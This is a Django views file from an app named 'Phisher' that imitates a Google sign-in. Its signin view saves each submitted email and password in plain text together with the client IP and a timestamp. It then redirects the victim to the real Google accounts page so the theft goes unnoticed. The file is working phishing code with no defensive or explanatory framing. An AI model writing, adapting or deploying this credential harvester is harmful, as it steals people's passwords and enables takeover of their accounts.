from Phisher.models import SignIn
from django.shortcuts import render, HttpResponsePermanentRedirect
from datetime import datetime
from .utils import get_client_ip


def index(request):
    return render(request, 'index.html')


def signin(request):
    try:
        if request.method == 'POST':
            email = request.POST.get('email', None)
            password = request.POST.get('password', None)
            client_ip = get_client_ip(request)

            if email and password:
                SignIn(email=str(email).strip(), password=str(
                    password).strip(), date_time=datetime.now(), client_ip=client_ip).save()
                return HttpResponsePermanentRedirect(f'https://accounts.google.com?authuser={email}')
            elif email:
                email = email.split('@')[0] + '@gmail.com'
                return render(request, 'passwd.html', {'email': email})

        return index(request)
    except Exception as e:
        print(e)
        return error(request)


def error(request):
    return render(request, '400.html')
